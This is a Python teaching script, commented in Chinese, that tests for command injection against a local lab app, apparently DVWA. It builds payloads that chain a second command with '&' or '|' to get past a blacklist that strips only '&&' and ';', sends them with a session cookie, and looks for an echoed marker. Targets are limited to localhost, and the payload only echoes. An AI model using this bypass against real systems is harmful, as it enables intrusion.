#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CMD-002 命令注入教学验证草案（仅限本地授权靶场）。
# 约束：只允许 localhost/127.0.0.1/::1，不跟随重定向，不读取系统敏感文件，不反弹连接。
import argparse
import http.client
import sys
from urllib.parse import urlsplit, urlencode

ALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')
DEFAULT_MARKER = 'CMD002_M_7f3a'

def build_payload(os_name, marker):
    if os_name == 'windows':
        # cmd.exe：单个 & 为命令分隔符；源码黑名单只删除了 && 和 ;
        return '127.0.0.1 & echo ' + marker
    # *nix：| 不在黑名单内，后接 echo 只回显标记
    return '127.0.0.1|echo ' + marker

def load_cookie(path):
    with open(path, 'r', encoding='utf-8') as handle:
        return handle.read().strip()

def send(base_url, path, ip_value, cookie, timeout):
    parts = urlsplit(base_url)
    if parts.scheme not in ('http', 'https'):
        raise ValueError('base-url 只允许 http/https')
    if parts.hostname not in ALLOWED_HOSTS:
        raise ValueError('仅允许本地靶场主机: ' + repr(ALLOWED_HOSTS))
    if parts.scheme == 'https':
        conn = http.client.HTTPSConnection(parts.hostname, parts.port, timeout=timeout)
    else:
        conn = http.client.HTTPConnection(parts.hostname, parts.port, timeout=timeout)
    body = urlencode({'Submit': 'Submit', 'ip': ip_value})
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookie,
        'Connection': 'close',
    }
    try:
        conn.request('POST', path, body=body, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        data = resp.read().decode('utf-8', 'replace')
    finally:
        conn.close()
    return status, data

def main():
    parser = argparse.ArgumentParser(description='CMD-002 命令注入本地验证草案')
    parser.add_argument('--base-url', required=True, help='例如 http://127.0.0.1')
    parser.add_argument('--path', required=True, help='例如 /vulnerabilities/exec/')
    parser.add_argument('--cookie-file', required=True, help='本地保存的会话 Cookie 文件')
    parser.add_argument('--os', dest='os_name', required=True, choices=('linux', 'windows'))
    parser.add_argument('--marker', default=DEFAULT_MARKER)
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    cookie = load_cookie(args.cookie_file)
    payload = build_payload(args.os_name, args.marker)
    print('[信息] payload: ' + payload)

    try:
        status, data = send(args.base_url, args.path, '127.0.0.1', cookie, args.timeout)
        print('[对照] HTTP 状态: ' + str(status))
        print('[对照] 响应片段: ' + data[:400])
        status2, data2 = send(args.base_url, args.path, payload, cookie, args.timeout)
        print('[测试] HTTP 状态: ' + str(status2))
        print('[测试] 响应片段: ' + data2[:800])
    except (OSError, ValueError, http.client.HTTPException) as exc:
        print('[失败] 请求异常: ' + repr(exc))
        return 1

    lines = [line.strip() for line in data2.splitlines()]
    if args.marker in lines:
        print('[观察] 标记单独成行，可能由命令解释器产生，需人工确认')
    elif args.marker in data2:
        print('[观察] 标记出现在响应中但未单独成行，可能只是输入回显')
    else:
        print('[观察] 未出现标记，本次测试无证据')
    return 0

if __name__ == '__main__':
    sys.exit(main())
